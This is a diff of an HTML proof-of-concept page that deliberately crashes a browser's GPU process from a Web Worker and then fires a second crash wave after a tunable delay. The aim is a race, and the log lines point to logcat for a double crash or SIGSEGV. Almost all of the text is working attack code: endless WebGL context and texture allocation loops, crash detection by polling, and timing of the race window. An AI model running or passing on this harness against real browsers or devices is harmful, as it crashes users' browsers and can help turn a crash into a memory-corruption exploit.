@@ -2,12 +2,12 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>GPU Dual-Crash Race (Worker + Auto-Retry)</title>
+  <title>GPU Dual-Crash Race (Robust Polling)</title>
 </head>
 <body>
-  <h3>GPU Dual-Crash Race (Worker, Auto-Detect)</h3>
+  <h3>GPU Dual-Crash Race – Main-Thread Polling</h3>
   <p>
-    <label>Delay after crash (ms): <input id="delay" type="number" value="0" step="5" min="0" max="500"></label>
+    <label>Delay after 1st crash (ms): <input id="delay" type="number" value="20" step="5" min="0" max="500"></label>
     <button id="start">Start Dual Crash</button>
     <span id="status">Ready</span>
   </p>
@@ -22,74 +22,46 @@
         console.log(msg);
       };
 
-      // Build the crash worker from your exact WebGL trigger code.
-      // The worker runs a tight loop of huge textures/renderbuffers.
-      // It detects GPU death when its own WebGL context is lost.
+      // Check if GPU process is alive by trying to create a tiny WebGL context
+      function isGpuAlive() {
+        try {
+          const c = document.createElement('canvas');
+          c.width = 1; c.height = 1;
+          const gl = c.getContext('webgl2');
+          return gl !== null;
+        } catch(e) { return false; }
+      }
+
+      // Create a Web Worker that runs the crash loop FOREVER
       function createCrashWorker() {
         const code = `
-          // Synchronous crash loop – no awaits, fast as possible
+          // Infinite crash loop – same primitives you confirmed work
           (function() {
-            // Create a context to use for the loop and to detect loss
-            const offscreen = new OffscreenCanvas(256, 256);
-            let gl = offscreen.getContext('webgl2', {
-              powerPreference: 'high-performance',
-              failIfMajorPerformanceCaveat: false
-            });
-            if (!gl) {
-              postMessage({ type: 'error', msg: 'WebGL2 not available in worker' });
-              return;
-            }
-            const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-
-            // Test cases that cause errors and eventually crash the GPU
-            const testCases = [
-              { w: 46341, h: 46341 },
-              { w: 65536, h: 65536 },
-              { w: maxSize, h: maxSize },
-              { w: maxSize/2, h: maxSize*2 },
-              { w: 1, h: 0xFFFFFFFF },
-              { w: 0xFFFF, h: 0xFFFF },
-              { w: 16384, h: 262144 },
-              { w: 262144, h: 1 }
+            const attrs = [
+              { powerPreference: 'high-performance' },
+              { powerPreference: 'low-power' },
+              { desynchronized: true },
+              { preserveDrawingBuffer: true },
+              { failIfMajorPerformanceCaveat: false },
+              { xrCompatible: true }
             ];
-
-            function testWebGLTexture(gl, width, height) {
-              try {
-                const tex = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, tex);
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-                const fb = gl.createFramebuffer();
-                gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
-                const rb = gl.createRenderbuffer();
-                gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
-                gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA8, width, height);
-                gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rb);
-                const buf = new Uint8Array(4);
-                gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, buf);
-              } catch(e) {
-                // Ignore individual errors – loop will keep trying
-              }
-            }
-
-            // Run the crash loop for up to 20 full rounds or until context lost
-            let rounds = 0;
-            while (rounds < 20) {
-              for (const test of testCases) {
-                // Check if context is lost (GPU died)
-                if (gl.isContextLost()) {
-                  postMessage({ type: 'crash', msg: 'Context lost detected in worker' });
-                  return;
+            // Run forever until terminated by main thread
+            while (true) {
+              for (let w = 1; w <= 16384; w *= 2) {
+                for (let h = 1; h <= 16384; h *= 2) {
+                  for (const attr of attrs) {
+                    try {
+                      const canvas = new OffscreenCanvas(w, h);
+                      const gl = canvas.getContext('webgl2', attr);
+                      if (!gl) continue;
+                      gl.clear(gl.COLOR_BUFFER_BIT);
+                      gl.flush();
+                      canvas.width = 0;
+                      canvas.height = 0;
+                    } catch(e) {}
+                  }
                 }
-                testWebGLTexture(gl, test.w, test.h);
               }
-              rounds++;
-            }
-            // If we finished without context loss, try getting a fresh context to check
-            gl = offscreen.getContext('webgl2');
-            if (!gl || gl.isContextLost()) {
-              postMessage({ type: 'crash', msg: 'GPU dead (post-loop check)' });
-            } else {
-              postMessage({ type: 'no_crash', msg: 'Worker finished but GPU still alive' });
             }
           })();
         `;
@@ -98,54 +70,56 @@
       }
 
       let running = false;
-      document.getElementById('start').addEventListener('click', () => {
+      document.getElementById('start').addEventListener('click', async () => {
         if (running) return;
         running = true;
-        document.getElementById('status').textContent = 'Wave 1: Crashing GPU...';
-        log('=== Wave 1: Starting crash worker ===');
+        document.getElementById('status').textContent = 'Wave 1: Stressing GPU...';
+        log('=== Wave 1: Starting infinite crash worker ===');
 
         const worker1 = createCrashWorker();
-        worker1.onmessage = async (e) => {
-          const data = e.data;
-          if (data.type === 'crash') {
-            log('[Worker1] GPU crash detected!');
-            worker1.terminate();
-            const delay = parseInt(document.getElementById('delay').value) || 0;
-            if (delay > 0) {
-              log('Waiting ' + delay + 'ms before second crash...');
-              document.getElementById('status').textContent = 'Waiting for race window...';
-              await new Promise(r => setTimeout(r, delay));
-            }
-            if (!running) return;
 
-            log('=== Wave 2: Firing second crash ===');
-            document.getElementById('status').textContent = 'Wave 2: Crashing GPU...';
-            const worker2 = createCrashWorker();
-            worker2.onmessage = (e2) => {
-              if (e2.data.type === 'crash') {
-                log('[Worker2] GPU crash detected!');
-                worker2.terminate();
-                log('=== Both waves completed. Check logcat for double-crash or browser SIGSEGV. ===');
-                document.getElementById('status').textContent = 'Done – check logcat';
-                running = false;
-              } else if (e2.data.type === 'no_crash') {
-                log('[Worker2] Did not crash GPU. Race may have missed window.');
-                document.getElementById('status').textContent = 'Wave 2 missed – adjust delay';
-                running = false;
-              }
-            };
-          } else if (data.type === 'no_crash') {
-            log('[Worker1] GPU did not crash. Try refreshing and running again.');
-            document.getElementById('status').textContent = 'Failed – GPU still alive';
-            running = false;
-          } else if (data.type === 'error') {
-            log('[Worker1] Error: ' + data.msg);
-            running = false;
+        // Poll every 200ms until GPU process is dead
+        let crashDetected = false;
+        for (let i = 0; i < 300; i++) { // max ~60 seconds
+          await new Promise(r => setTimeout(r, 200));
+          if (!isGpuAlive()) {
+            crashDetected = true;
+            break;
           }
-        };
+        }
+
+        if (!crashDetected) {
+          log('[!] GPU did not crash within 60s. Aborting.');
+          worker1.terminate();
+          document.getElementById('status').textContent = 'Failed – GPU still alive';
+          running = false;
+          return;
+        }
+
+        // GPU is dead – terminate the first worker
+        log('[Worker1] GPU crash detected (main thread).');
+        worker1.terminate();
+        const delay = parseInt(document.getElementById('delay').value) || 20;
+        log('Waiting ' + delay + 'ms before second crash...');
+        document.getElementById('status').textContent = 'Waiting for race window...';
+        await new Promise(r => setTimeout(r, delay));
+
+        if (!running) return;
+
+        log('=== Wave 2: Firing second crash ===');
+        document.getElementById('status').textContent = 'Wave 2: Stressing GPU...';
+        const worker2 = createCrashWorker();
+
+        // Let worker2 run for a while, then stop (or detect second crash)
+        // We'll rely on logcat to see the second crash; worker2 keeps stress high.
+        await new Promise(r => setTimeout(r, 10000)); // 10 seconds of stress
+        worker2.terminate();
+        log('=== Both waves completed. Check logcat for double-crash or browser SIGSEGV. ===');
+        document.getElementById('status').textContent = 'Done – check logcat';
+        running = false;
       });
 
-      log('Ready. Press "Start Dual Crash". Configure delay (0ms recommended).');
+      log('Ready. Press "Start Dual Crash". Tune delay if needed (start with 20ms).');
     })();
   </script>
 </body>
